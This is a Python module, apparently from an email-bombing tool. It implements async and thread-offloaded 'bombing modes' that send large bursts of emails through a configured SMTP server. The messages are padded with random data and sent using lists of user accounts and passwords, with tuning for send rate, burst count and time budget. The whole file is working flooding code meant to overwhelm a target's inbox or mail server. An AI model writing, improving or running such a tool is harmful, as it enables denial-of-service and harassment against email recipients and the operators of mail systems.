from __future__ import annotations

import asyncio
import logging
import sys
import time
from typing import Optional

from ..config import Config
from .core import async_throttle

logger = logging.getLogger(__name__)


async def _async_bombing_mode_threaded(
    cfg: Config, attachments: Optional[list[str]] = None
) -> None:
    from . import append_message, sendmail as _sendmail, sizeof_fmt

    logger.info("Generating %s of data to append to message", sizeof_fmt(cfg.SB_SIZE))

    class Counter:
        def __init__(self) -> None:
            self.value = 0

    fail_count = Counter()
    fail_lock = asyncio.Lock()
    message = append_message(cfg, attachments)
    logger.info("Message using %s of random data", sizeof_fmt(sys.getsizeof(message)))

    start_budget = time.monotonic()
    for b in range(cfg.SB_BURSTS):
        if cfg.SB_PER_BURST_DATA:
            message = append_message(cfg, attachments)
        numbers = range(1, cfg.SB_SGEMAILS + 1)
        tasks: list[asyncio.Task[None]] = []
        if fail_count.value >= cfg.SB_STOPFQNT and cfg.SB_STOPFAIL:
            break
        for number in numbers:
            if fail_count.value >= cfg.SB_STOPFQNT and cfg.SB_STOPFAIL:
                break
            if (
                cfg.SB_BUDGET_SECONDS
                and (time.monotonic() - start_budget) >= cfg.SB_BUDGET_SECONDS
            ):
                logger.info("Time budget reached; stopping sends")
                break
            await async_throttle(cfg, cfg.SB_SGEMAILSPSEC)

            async def _runner(n: int, brst: int) -> None:
                await asyncio.to_thread(
                    _sendmail,
                    n,
                    brst,
                    fail_count,
                    message,
                    cfg,
                    server=cfg.SB_SERVER,
                    users=cfg.SB_USERLIST,
                    passwords=cfg.SB_PASSLIST,
                    fail_lock=fail_lock,
                )

            tasks.append(
                asyncio.create_task(_runner(number + (b * cfg.SB_SGEMAILS), b + 1))
            )
        if tasks:
            await asyncio.gather(*tasks)
        await async_throttle(cfg, cfg.SB_BURSTSPSEC)

    if cfg.SB_RAND_STREAM:
        try:
            cfg.SB_RAND_STREAM.close()
        except Exception:
            pass


async def async_bombing_mode(
    cfg: Config, attachments: Optional[list[str]] = None
) -> None:
    use_thread_offload = getattr(cfg, "SB_ASYNC_THREAD_OFFLOAD", False)
    if getattr(cfg, "SB_ASYNC_NATIVE", False):
        use_thread_offload = False

    if not use_thread_offload:
        try:
            from .native import _async_bombing_mode_native

            await _async_bombing_mode_native(cfg, attachments)
            return
        except RuntimeError as exc:
            logger.warning("aiosmtplib native mode unavailable: %s", exc)
        except ImportError:
            logger.warning(
                "aiosmtplib is not installed; falling back to thread offload"
            )

    await _async_bombing_mode_threaded(cfg, attachments)
